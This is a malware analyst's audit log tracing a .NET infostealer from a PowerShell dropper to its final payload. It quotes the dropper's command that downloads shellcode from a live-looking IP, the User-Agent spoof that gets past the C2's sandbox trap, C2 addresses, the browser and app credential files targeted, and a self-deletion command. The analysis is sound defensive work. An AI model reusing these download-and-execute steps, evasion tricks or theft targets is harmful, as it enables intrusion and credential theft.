# Investigation Audit Log

**Case:** Multi-Stage .NET Infostealer
**Analyst:** manilka12
**Date:** June 2026

*Note: This is the raw technical audit log documenting the complete reverse-engineering process of the malware chain.*

---

## Phase 0: Initial Triage & Dropper (`hack2.txt`)
- **Initial Vector:** Recovered a suspicious file named `hack2.txt` from an infected machine.
- **Analysis:** It is a PowerShell script masquerading as a text file.
- **Behavior:** The script initiates a web request to download an image file:
  `Invoke-WebRequest -Uri "http://158.94.208.104/x7GkP2mQ9zL4/my_newest_ll.png"`
- **Execution:** Instead of saving the PNG, the script uses `Add-Type` to compile a C# class on the fly. It imports native Windows APIs (`VirtualAlloc`, `CreateThread`, `Marshal.Copy`) to allocate executable memory, copy the "PNG" directly into RAM, and execute it as a new thread. 
- **Conclusion:** The PNG is not an image; it is 53 KB of Donut Shellcode. Note: The script is currently defanged but still contains the RWX allocation sequence.

## Phase 1: Shellcode & Injector Module (`stage4.exe`)
- **Extraction:** The memory region allocated by `VirtualAlloc` was dumped to disk. The shellcode is obfuscated using the **Chaskey Block Cipher** (a lightweight encryption algorithm). 
- **Reversing `stage4.exe`:**
  - Dumped strings and analyzed the WinHTTP imports.
  - Found it targets `svchost.exe` and `powershell.exe` for process injection.
  - **Geo-Fencing Evasion:** The injector queries `HKCU\Control Panel\International\Geo\Name` to find the victim's country code. It checks for `RU` and `BY` (likely terminating to avoid infecting CIS machines).
  - **Anti-Sandbox HTTP Evasion:** When attempting to download the next stage, the C2 server (`158.94.208.104`) checks the HTTP `User-Agent`. If a standard browser string (e.g., Mozilla) or standard `curl` is used, the Apache server throws a `302 Found` and redirects to a massive 1.3 MB fake Cloudflare HTML page. 
  - **Bypass:** Analysis revealed that the injector spoofs its User-Agent using either the local country code (e.g., `US`) or the exact string `powershell`. By passing `User-Agent: powershell` via Python, the Cloudflare trap was bypassed, allowing the successful download of the true payload: `my_s.bin` (312 KB).

## Phase 2: Unpacking the Final Payload (`my_s_real.bin`)
- **Structure:** `my_s.bin` is a native wrapper that decrypts and loads a heavily obfuscated .NET assembly at offset `0x1ba40`.
- **Decompilation:** The .NET PE file was extracted and the MSIL was decompiled back into C# source code (`infostealer_decompiled.cs`, ~15,000+ lines).
- **String & Constant Obfuscation:** The source code obfuscates primitive values. Static analysis identified 228 string-returning calls and 787 total encoded constants (including strings, int32s, booleans, and int64s).
- **Decoding Mechanism:** The malware does NOT use AES for string encryption. Instead, it utilizes a custom encoded-constant routine involving shuffled hexadecimal decoding, a 256-byte substitution table, byte arithmetic/rotations, and a checksum.
- **C2 Transport Encryption:** The malware uses AES-CBC for command and control transport, utilizing a static 16-byte bootstrap key for the initial network session.

## Phase 3: Capabilities & TTPs (Confirmed in Source)
With the source code audited, the true nature of the malware was exposed:

1. **True C2 Server Identified:** The malware utilizes a raw-TCP C2 connection at `91.92.243.161:3038`.
2. **System Fingerprinting (WMI & Registry):** The malware gathers system telemetry. At line 968, it reads `HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0\ProcessorNameString` for CPU fingerprinting. It does NOT establish registry persistence.
3. **Process Enumeration:** At line 13274, the malware uses `Process.GetProcesses()` for enumeration. There is no evidence of it actively terminating analysis tools.
4. **Infostealing Targets:** 
   - Browsers: `Login Data`, `Cookies`, `History`, `Web Data`, `Preferences` (Chromium). `formhistory.sqlite`, `places.sqlite`, `cookies.sqlite`, `logins.json`, `key4.db` (Firefox).
   - Gaming: Steam (`config.vdf`, `loginusers.vdf`).
   - Comms: Telegram Desktop UWP, Discord.
5. **App-Bound Encryption Targeting:** The malware attempts to extract the App-Bound shared-memory marker `__AE_SHM_MARKER_` from Chrome to facilitate password theft.
6. **Self-Deletion:** The malware executes a delayed deletion command (`cmd /C ping ... & del ...`) to remove itself after execution.

## Conclusion
The investigation successfully mapped the entire attack chain from the initial PowerShell stager to the final .NET memory payload. The C2 infrastructure, WMI fingerprinting, custom constant decoding, and App-Bound targeting have been verified through static analysis.
